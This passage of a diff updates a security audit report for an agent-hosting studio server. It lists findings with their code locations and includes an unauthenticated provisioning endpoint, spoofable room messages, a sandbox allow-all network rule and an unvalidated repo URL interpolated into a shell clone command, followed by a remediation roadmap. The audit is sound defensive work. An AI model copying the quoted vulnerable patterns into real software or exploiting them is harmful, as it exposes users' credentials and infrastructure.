-- Consider using `sessionStorage` (cleared on tab close) for short-lived sessions
-- Implement strong CSP headers to mitigate XSS
-- For production, consider a server-side session model where the server holds credentials and the client only has an httpOnly session cookie
+- Include a timestamp in HMAC input and validate freshness (e.g., 24h TTL)
+- Or migrate to JWTs with `exp` claim
+
+---
+
+### 11. MEDIUM: `/api/provision-electric` Is Unauthenticated
+
+**File:** `packages/studio/src/server.ts:393-409`
+
+**Impact:** Each call provisions real Electric Cloud infrastructure (database + sync service). An attacker can abuse this for resource exhaustion / cost generation.
+
+**Recommendation:**
+- Require authentication (session token or admin key)
+- Add request throttling at minimum
+
+---
+
+### 12. MEDIUM: Room Message `from` Field Is Not Cryptographically Verified
+
+**File:** `packages/studio/src/room-router.ts:152-163`
+
+```typescript
+async sendMessage(from: string, body: string, to?: string): Promise<void> {
+    const event: RoomEvent = {
+        type: "agent_message",
+        from,          // Display name — not verified
+        body,
+        ts: ts(),
+    }
+    await this.stream.append(JSON.stringify(event))
+}
+```
+
+**Impact:**
+- The `POST /api/rooms/:id/messages` endpoint (now auth-protected by room token) accepts a `from` field that is a display name
+- Any room member can send messages impersonating another participant
+- The `from` field should either be server-enforced or cryptographically signed
+
+**Mitigating factor:** Room token auth means only room members can send messages.
+
+**Recommendation:**
+- Server should look up the caller's identity and set `from` server-side instead of accepting it from the client
+
+---
+
+### 13. MEDIUM: Missing HTTP Security Headers
+
+**File:** `packages/studio/src/server.ts`
+
+The server does not set standard security headers:
+- No `Content-Security-Policy` (critical for mitigating XSS from finding #5)
+- No `X-Content-Type-Options: nosniff`
+- No `X-Frame-Options: DENY`
+- No `Strict-Transport-Security` (HSTS)
+
+**Recommendation:**
+- Add Hono middleware to set security headers on all responses
+
+---
+
+### 14. MEDIUM: Credentials Stored in localStorage (XSS Amplifier)
+
+**File:** `packages/studio/client/src/lib/credentials.ts`
+
+API keys and OAuth tokens stored at:
+- `electric-agent:anthropic-api-key`
+- `electric-agent:oauth-token`
+- `electric-agent:gh-token`
+
+**Impact:** Any XSS vulnerability (finding #5) can steal all stored credentials.
+
+**Recommendation:**
+- Consider `sessionStorage` (cleared on tab close)
+- Implement strong CSP headers to mitigate XSS impact
+- For production, use server-side sessions with httpOnly cookies
+
+---
+
+### 15. MEDIUM: Sandbox Network Policy Allows All Outbound Traffic
+
+**File:** `packages/studio/src/sandbox/sprites.ts:96-111`
+
+```typescript
+private async setNetworkPolicyAllowAll(spriteName: string): Promise<void> {
+    const resp = await fetch(url, {
+        method: "POST",
+        body: JSON.stringify({
+            rules: [{ domain: "*", action: "allow" }],
+        }),
+    })
+}
+```
+
+**Impact:**
+- A compromised agent can make arbitrary outbound requests
+- Can reach the studio server's internal API (enabling attacks on unauthenticated endpoints)
+- Can exfiltrate data (credentials, code, conversation history) to any external server
+
+**Recommendation:**
+- Restrict outbound to only necessary domains: `api.anthropic.com`, `github.com`, `api.github.com`, `registry.npmjs.org`, etc.
+- Block access to the studio server's internal IP/hostname from sandboxes
+- Use a network-level firewall if the sandbox runtime supports it
+
+---
+
+### 16. MEDIUM: Docker Sandbox Missing Input Validation on Repo URL
+
+**File:** `packages/studio/src/sandbox/docker.ts:510-535`
+
+**Description:**
+The Docker sandbox provider's `createFromRepo` method does **not** validate `repoUrl` or `branch` before constructing shell commands, unlike the Sprites provider which uses `validateRepoUrl()` and `validateBranchName()`:
+
+```typescript
+// docker.ts — NO validation
+async createFromRepo(sessionId, repoUrl, opts) {
+    execInContainer(state,
+        `gh repo clone "${repoUrl}" "${targetDir}" 2>/dev/null || git clone "${repoUrl}" "${targetDir}"`)
+}
+
+// sprites.ts — HAS validation
+async createFromRepo(sessionId, repoUrl, opts) {
+    validateRepoUrl(repoUrl)       // ✓
+    if (opts?.branch) validateBranchName(opts.branch)  // ✓
+}
+```
+
+**Impact:** While the Docker provider uses double-quoted shell interpolation (providing some protection), a malicious `repoUrl` with shell metacharacters could still potentially escape the quoted context.
+
+**Recommendation:**
+- Apply the same `validateRepoUrl()` and `validateBranchName()` calls in the Docker provider
+- Or better: validate at the server layer before dispatching to any sandbox provider
+
+---
+
+### 17. MEDIUM: Session/Room Tokens Exposed in SSE Query Strings
+
+**Files:** `packages/studio/src/server.ts:2334,2255`, `docs/security.md:106`
+
+**Description:**
+The EventSource API (SSE) does not support custom headers. Session and room tokens are passed as query parameters:
+
+```
+GET /api/sessions/:id/events?token=<session-token>
+GET /api/rooms/:id/events?token=<room-token>
+```
+
+**Impact:**
+- Tokens appear in **server access logs** (nginx, CloudFlare, AWS ALB)
+- Tokens may leak via **HTTP Referer headers** if users navigate away
+- Tokens are visible in **browser history** and to **browser extensions**
+- Load balancer and proxy logs retain the full URL including the token
+
+**Mitigating factor:** This is a known limitation of the EventSource API. The `docs/security.md` acknowledges this design choice.
+
+**Recommendation:**
+- Use `fetch()` with streaming response and custom headers instead of `EventSource`
+- If EventSource is required, use short-lived tokens specifically for SSE endpoints
+- Ensure server/proxy logs redact query parameters containing tokens
 
 ---
 
@@ -569,81 +529,122 @@ The following security aspects are **well-implemented**:
 |---|---|
 | **Timing-safe token comparison** | `session-auth.ts` uses `crypto.timingSafeEqual()` — prevents timing attacks |
 | **HMAC-SHA256 token derivation** | Stateless, deterministic, cryptographically sound |
-| **Purpose-scoped hook tokens** | Hook tokens use `hook:` prefix, preventing token confusion attacks |
-| **Electric Cloud creds server-side** | `ELECTRIC_SOURCE_ID`/`ELECTRIC_SECRET` are injected by the proxy, never sent to the browser |
+| **Purpose-scoped tokens** | Session, hook, and global hook tokens use different HMAC prefixes — prevents token confusion |
+| **Room token auth middleware** | Room routes now validate `X-Room-Token` header (fixed since last audit) |
+| **DS_SECRET isolation** | Master secret no longer passes to sandboxes — proxy pattern enforced |
+| **Global hook authentication** | `/api/hook` now requires `HMAC-SHA256(DS_SECRET, "global-hook")` |
+| **Command injection prevention** | `validateName`, `validateBranchName`, `validateRepoUrl`, `shellQuote` functions |
 | **No raw SQL** | Drizzle ORM prevents SQL injection in generated apps |
-| **No `eval()` or `Function()`** | No dynamic code execution patterns found |
-| **Secure random generation** | Uses `crypto.randomUUID()` and `crypto.randomBytes()` throughout |
-| **Shell argument escaping in bridge** | `claude-code-sprites.ts:81` properly escapes single quotes in CLI args |
-| **Comprehensive auth tests** | 35 tests in `session-auth.test.ts` covering token validation, cross-session rejection |
+| **No `eval()` or `Function()`** | No dynamic code execution patterns |
+| **Secure random generation** | `crypto.randomUUID()` and `crypto.randomBytes()` throughout |
+| **Stream append proxy validation** | Content-Type, 64KB size limit, JSON validity enforced |
+| **Session token on add-existing-session** | `POST /api/rooms/:id/sessions` requires both room token AND session token |
 
 ---
 
-## Summary of Credential Handling
+## Assessment Against User Requirements
 
-Per the user's requirement: **"the server never stores user credentials (Claude and GitHub keys)"**
+### Requirement 1: "Sandbox cannot interfere with other sandboxes unless in the same room"
+
+| Layer | Status | Details |
+|---|---|---|
+| VM isolation | **PASS** | Each sandbox runs in its own Sprites VM or Docker container |
+| Session token auth | **PASS** | Session-scoped endpoints require HMAC tokens |
+| Room token auth | **PASS** | Room-scoped endpoints require room tokens (newly fixed) |
+| Sandbox → Studio API | **PARTIAL** | Sandbox could reach unauthenticated endpoints (finding #3, #14) |
+| Stream-level isolation | **PARTIAL** | DS_SECRET no longer in sandboxes (fixed), but single master key at server layer (finding #1) |
+| Network isolation | **FAIL** | `domain: "*"` allows sandbox to reach any endpoint including the studio server (finding #14) |
+
+**Summary:** Room token auth is the primary improvement. The remaining gap is that sandboxes have unrestricted network access and several studio endpoints lack authentication. A compromised sandbox could reach unauthenticated sandbox/session-creation endpoints.
+
+### Requirement 2: "Server never stores user credentials (Claude and GitHub keys)"
 
 | Aspect | Status | Details |
 |---|---|---|
 | Database storage | **PASS** | No database stores credentials |
-| Server memory | **PARTIAL** | Credentials exist in-memory during request handling and in sandbox creation closures |
-| Server filesystem | **PASS** | Server process doesn't write creds to disk |
-| Sandbox filesystem | **FAIL** | Credentials are written to `/etc/profile.d/electric-agent.sh` as plaintext exports |
-| Server logs | **FAIL** | OAuth token partially logged (first 20 + last 10 chars) |
-| Durable Streams | **PASS** | Credentials are not written to event streams |
+| Server filesystem | **PASS** | Server process doesn't write credentials to disk |
+| Server memory | **PARTIAL** | Credentials exist transiently during request handling |
+| Sandbox filesystem | **FAIL** | Written to `/etc/profile.d/electric-agent.sh` as plaintext |
+| Server logs | **PASS** | Only logs token length (fixed) |
+| Durable Streams | **PASS** | Credentials not in event streams |
 
----
+**Summary:** The server process itself does not persistently store credentials. However, credentials ARE persisted inside sandbox VMs as plaintext files. Whether the sandbox counts as "the server" depends on your threat model — if the requirement means "the studio server Node.js process," it passes. If it means "the entire platform," it fails due to sandbox filesystem persistence.
 
-## Summary of Sandbox Isolation
+### Requirement 3: "No agent can talk directly to another agent without being in the same room"
 
-Per the user's requirement: **"sandboxes cannot interfere with each other unless in the same room"**
-
-| Aspect | Status | Details |
-|---|---|---|
-| VM isolation | **PASS** | Each sandbox runs in its own Sprites VM or Docker container |
-| Network isolation | **PARTIAL** | Sprites have `domain: "*"` network policy (all outbound allowed). A sandbox could reach the studio API. |
-| Stream isolation | **FAIL** | Single DS_SECRET means any entity with it can access any stream |
-| Room enforcement | **FAIL** | Room APIs are unauthenticated — any caller can add agents to any room |
-| API isolation | **FAIL** | No auth on sandbox/room APIs — any sandbox that can reach the studio server can manipulate rooms |
-
----
-
-## Summary of Agent-to-Agent Isolation
-
-Per the user's requirement: **"no agent can talk directly to another agent without being in the same room"**
-
-| Aspect | Status | Details |
+| Layer | Status | Details |
 |---|---|---|
 | Room router enforcement | **PASS** | `RoomRouter.deliverMessage()` only delivers to registered participants |
-| API-level enforcement | **FAIL** | `POST /api/rooms/:id/messages` is unauthenticated — any agent can send to any room |
-| Stream-level enforcement | **FAIL** | Agents could write directly to room Durable Streams if they have the DS_SECRET |
-| Session iterate bypass | **FAIL** | `POST /api/rooms/:id/sessions/:sessionId/iterate` is unauthenticated — can command any agent in any room |
+| Room API auth | **PASS** | Room endpoints now require room tokens (newly fixed) |
+| Message integrity | **PARTIAL** | `from` field is a display name, not cryptographically verified (finding #11) |
+| Session iterate | **PASS** | `POST /api/rooms/:id/sessions/:sessionId/iterate` requires room token |
+| Direct stream access | **PASS** | Sandboxes no longer have DS_SECRET — can't write to room streams directly |
+
+**Summary:** The room token middleware is the key fix. Agents can only communicate through rooms they have tokens for. The remaining gap is message impersonation within a room (finding #11).
 
 ---
 
 ## Priority Remediation Roadmap
 
-### Phase 1 (Immediate — blocks deployment)
-1. **Add auth to room endpoints** — Validate room tokens on all `/api/rooms/:id/*` operations
-2. **Add auth to `/api/hook`** — Require a shared secret or signed payload
-3. **Add auth to sandbox endpoints** — Admin-level authentication for `/api/sandboxes/*`
-4. **Fix CORS** — Restrict to known origins
-5. **Stop logging credentials** — Remove the partial OAuth token log at `server.ts:2799`
-6. **Add input validation** — Use Zod schemas on all API request bodies
-7. **Fix XSS** — Sanitize `dangerouslySetInnerHTML` inputs in Markdown.tsx and ToolExecution.tsx
+### Phase 1 — Immediate (blocks production)
+1. **Restrict CORS** — Replace `origin: "*"` with known origins (finding #4)
+2. **Auth sandbox endpoints** — Add admin auth to all `/api/sandboxes/*` routes (finding #3)
+3. **Fix XSS** — Sanitize `dangerouslySetInnerHTML` inputs with DOMPurify (finding #5)
+4. **Remove/protect keychain endpoint** — Delete in production or add auth (finding #7)
+5. **Fix path traversal** — Use `path.resolve()` for file-content endpoint (finding #8)
+6. **Add input validation** — Zod schemas on all API request bodies (finding #6)
 
-### Phase 2 (Short-term — before GA)
-1. **Scope DS credentials** — Use per-room/per-session JWTs instead of the master DS_SECRET
-2. **Validate session linkage** — Check that session ID is linked before minting tokens at `/api/shared-sessions/:id/sessions/:sessionId/token`
-3. **Sanitize shell inputs** — Use `execFile` with argument arrays everywhere; validate `branch`, `repoUrl`, `projectName`
-4. **Credential proxy** — Avoid writing raw API keys to sandbox filesystems
-5. **Fix path traversal** — Use `path.resolve()` + `path.relative()` in file-content endpoint
-6. **Add security headers** — CSP, X-Content-Type-Options, X-Frame-Options, HSTS
+### Phase 2 — Before GA
+7. **Credential proxy** — Route Claude/GitHub API calls through studio server so sandboxes never hold raw keys (finding #2)
+8. **Restrict sandbox network** — Replace `domain: "*"` with allowlisted domains (finding #15)
+9. **Server-side `from` enforcement** — Set message sender identity server-side (finding #12)
+10. **Auth session creation** — Protect `POST /api/sessions` and `/api/sessions/resume` (finding #3)
+11. **Auth `/api/provision-electric`** — Add auth or throttling (finding #11)
+12. **Add security headers** — CSP, X-Content-Type-Options, X-Frame-Options, HSTS (finding #13)
+13. **Scope room tokens** — Add `room:` prefix to room token HMAC to prevent token confusion (finding #8)
+14. **Docker input validation** — Apply `validateRepoUrl`/`validateBranchName` in Docker provider (finding #16)
 
-### Phase 3 (Medium-term — hardening)
-1. **Token expiry** — Add TTL to session/room tokens
-2. **Message signing** — Cryptographically sign room messages
-3. **Network policy** — Restrict sandbox outbound to only necessary endpoints (not `domain: "*"`)
-4. **Audit logging** — Log security-relevant events (auth failures, room modifications)
-5. **Remove `/api/credentials/keychain`** in production
-6. **Consider server-side credential session** — Replace localStorage API key storage with httpOnly cookie session
+### Phase 3 — Hardening
+15. **Scoped DS credentials** — Per-room/per-session JWTs at the Durable Streams layer (finding #1)
+16. **Token expiry** — Add TTL to session/room tokens (finding #10)
+17. **Audit logging** — Log security events (auth failures, room modifications, credential access)
+18. **Replace localStorage** — Server-side session model with httpOnly cookies (finding #14)
+
+---
+
+## Appendix: Files Analyzed
+
+### Studio Server
+- `packages/studio/src/server.ts` — Main API server (2800+ lines)
+- `packages/studio/src/session-auth.ts` — Token derivation and validation
+- `packages/studio/src/streams.ts` — Durable Stream connection config
+- `packages/studio/src/room-router.ts` — Agent-to-agent message routing
+- `packages/studio/src/room-registry.ts` — Room metadata persistence
+- `packages/studio/src/gate.ts` — Human-in-the-loop gating
+- `packages/studio/src/invite-code.ts` — Room invite code generation
+
+### Sandbox
+- `packages/studio/src/sandbox/sprites.ts` — Fly.io Sprites sandbox provider
+- `packages/studio/src/sandbox/docker.ts` — Docker sandbox provider
+- `packages/studio/src/sandbox/types.ts` — Sandbox interface definitions
+
+### Bridge
+- `packages/studio/src/bridge/hosted.ts` — Hosted Durable Stream bridge
+- `packages/studio/src/bridge/claude-code-sprites.ts` — Claude Code Sprites bridge
+- `packages/studio/src/bridge/claude-code-docker.ts` — Claude Code Docker bridge
+- `packages/studio/src/bridge/message-parser.ts` — Room message parsing
+
+### Client
+- `packages/studio/client/src/lib/credentials.ts` — localStorage credential storage
+- `packages/studio/client/src/lib/api.ts` — API client with credential injection
+- `packages/studio/client/src/components/Markdown.tsx` — Markdown rendering (XSS surface)
+- `packages/studio/client/src/components/ToolExecution.tsx` — Tool output rendering (XSS surface)
+
+### Protocol
+- `packages/protocol/src/events.ts` — Event type definitions
+
+### Agent
+- `packages/agent/src/git/index.ts` — GitHub token handling in agent
+
+### Documentation
+- `docs/security.md` — Authentication architecture documentation
